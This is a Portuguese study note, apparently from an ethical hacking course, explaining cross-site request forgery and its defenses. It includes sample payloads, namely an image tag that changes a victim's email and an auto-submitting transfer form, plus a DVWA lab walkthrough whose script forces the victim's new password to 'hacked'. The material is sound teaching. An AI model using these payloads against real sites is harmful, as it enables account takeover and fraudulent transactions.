# CSRF (Cross-Site Request Forgery)

Vulnerabilidade em que um site malicioso **induz** o navegador da vítima (já autenticada em outro site) a **enviar uma requisição não autorizada** para esse site alvo, **usando automaticamente os cookies/sessão** da vítima.

Resultado: ações como mudar senha, transferir dinheiro, postar conteúdo, etc., **sem o consentimento** do usuário.

**Como o ataque funciona**

1. Você faz login no **site-alvo.com** (o cookie de sessão fica salvo no navegador).
2. Sem sair da sessão, você visita **site-malicioso.com**.
3. A página maliciosa carrega um recurso que **dispara uma requisição** para o site-alvo (por ex., `<img>`, `<form auto-submit>`, `fetch` com `credentials`), e o navegador **anexa o cookie de sessão automaticamente**.
4. O site-alvo recebe a requisição como se fosse sua e executa a ação (se não tiver proteção anti-CSRF).

### Exemplos simples de payload

#### 1) GET “idempotente” mal usado

Se o site-alvo troca e-mail via GET (má prática):

```html
<!-- em site-malicioso.com -->
<img src="https://site-alvo.com/conta?acao=trocarEmail&novo=ataque@evil.com">
```

O navegador envia a requisição com **cookies da sessão**.

#### 2) POST com auto-submit

```html
<form action="https://site-alvo.com/transferir" method="POST">
  <input type="hidden" name="para" value="conta_do_atacante">
  <input type="hidden" name="valor" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

### CSRF x XSS (diferença)

* **CSRF**: usa **sua sessão** para enviar uma requisição **sem rodar código no site-alvo** (o código roda no site malicioso).
* **XSS**: injeta **código** (JavaScript) no **próprio site-alvo**.
* Um XSS **pode** facilitar CSRF (e pior: permitir roubo de tokens).

### Defesas eficazes

1. **Tokens anti-CSRF (synchronizer token pattern)**

   * Gerar um **token aleatório por sessão/req**, incluir no **form**/header e **validar no servidor**.
   * O atacante **não consegue ler** o token por estar em outro domínio.

   ```html
   <!-- Servidor insere token no form -->
   <input type="hidden" name="csrf" value="RANDOM_TOKEN">
   ```

   ```python
   # No servidor, validar
   assert request.form["csrf"] == session["csrf_token"]
   ```

2. **SameSite Cookie** (mitigação de navegador)

   * Configure cookies de sessão com `SameSite=Lax` (padrão moderno) ou `SameSite=Strict`.
   * Para cenários 3rd-party (ex.: SSO, iframes), se precisar `SameSite=None`, **exija `Secure`** e redobre as proteções de token.

   ```
   Set-Cookie: sid=...; Path=/; HttpOnly; Secure; SameSite=Lax
   ```

3. **Verificação de Origem**

   * Validar **`Origin`** (preferível) ou **`Referer`** para ações sensíveis.
   * Se `Origin` ausente (requests antigos/alguns navegadores), use fallback para `Referer` exigindo o mesmo **scheme+host+port**.

4. **Exigir POST/PUT/DELETE para ações de estado**

   * **Nunca** realizar mudanças com **GET**.
   * Ainda assim, **POST sem token** é vulnerável; combine com #1.

5. **Reautenticação / Confirmação de passo**

   * Para operações críticas (ex.: alterar senha, transferências), peça senha/2FA/confirmar via e-mail/app.

6. **CORS bem configurado**

   * Não use `Access-Control-Allow-Origin: *` com **credenciais**.
   * Se expor APIs, delimite origens confiáveis e use **preflight** corretamente.

7. **Cabeçalhos e práticas adicionais**

   * `Content-Type` controlado (evita CSRF via `application/x-www-form-urlencoded`/`multipart/form-data` simplista).
   * Desabilite **autofill perigoso** e use **Double Submit Cookie** quando sincronizer token não for viável:

     * Servidor define cookie `csrf=RANDOM`.
     * Cliente envia o mesmo valor num campo/`X-CSRF-Token`.
     * Servidor compara **cookie vs campo/header**.

> **CAPTCHA** sozinho **não** é proteção confiável de CSRF (reduz automatização, mas não garante origem).

### Padrões por framework (use o que já existe!)

* **Django**: `csrf_token` no template + middleware.
* **Rails**: `protect_from_forgery` + tag CSRF no `<head>`.
* **Spring Security**: CSRF habilitado por padrão em formulários.
* **Express/Node**: libs como `csurf`.
* **Laravel**: `@csrf` nos forms (Blade) e verificação automática.

### Dicas para SPAs / JWT

* Em SPAs com **JWT em cookie**, **ainda há risco de CSRF** → use **SameSite** e **tokens anti-CSRF**.
* Se o JWT fica **em storage** (local/session), CSRF cai, mas **XSS vira risco maior** (roubo de token).
* Envie token CSRF em **header customizado** (`X-CSRF-Token`) e valide no backend.

---
## Metasploit2 CSRF

O ataque consiste em replicar a página do site, modifiando-a para inserir na troca de senha, a password que desejarmos e "roubar" o acesso.

O HTML da página está no arquivo [CSRF.html](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/0c0939d1cd0e6629c25777a586343ed6bb4874f9/7%20-%20websites/10.1%20-%20CSRF.html), e é basicamente o mesmo da página original com as seguintes modificações:

* `<form action="http://192.168.1.33/dvwa/vulnerabilities/csrf/" method="GET" onsubmit="forcarHacked(this)">`
  * **action** direciona o usuário de volta ao website, após a mudança de senha.
  * **onsubmit** executa o JavaScript que irá alterar o valor inserido pelo usuário nos campos do formulário antes do envio.
  * **method GET** pode ser alterado para **POST** para não refletir a alteração na URL. Como o merasploit não reconhece **POST**, não foi utilizado aqui.
* Inserção do Script forcarHacked
  ```
  <script>
  function forcarHacked(form) {
    const hack = 'hacked';
    const pw  = form.querySelector('input[name="password_new"]');
    const pw2 = form.querySelector('input[name="password_conf"]');
    if (pw)  pw.value  = hack;
    if (pw2) pw2.value = hack;
    // sem return false → deixa enviar normalmente
  }
  </script>
  ```
* Adicionalmente é copiado o arquivo [main.css](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/4a87172a31cfe7fc32e8ebd32d5307bcda3d5e93/7%20-%20websites/10.2%20-%20main.css) para o lacal de paǵina de ataque, e referenciado no cabeçalho do arquivo [CSRF.html](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/0c0939d1cd0e6629c25777a586343ed6bb4874f9/7%20-%20websites/10.1%20-%20CSRF.html) - `<link rel="stylesheet" type="text/css" href="main.css" />`
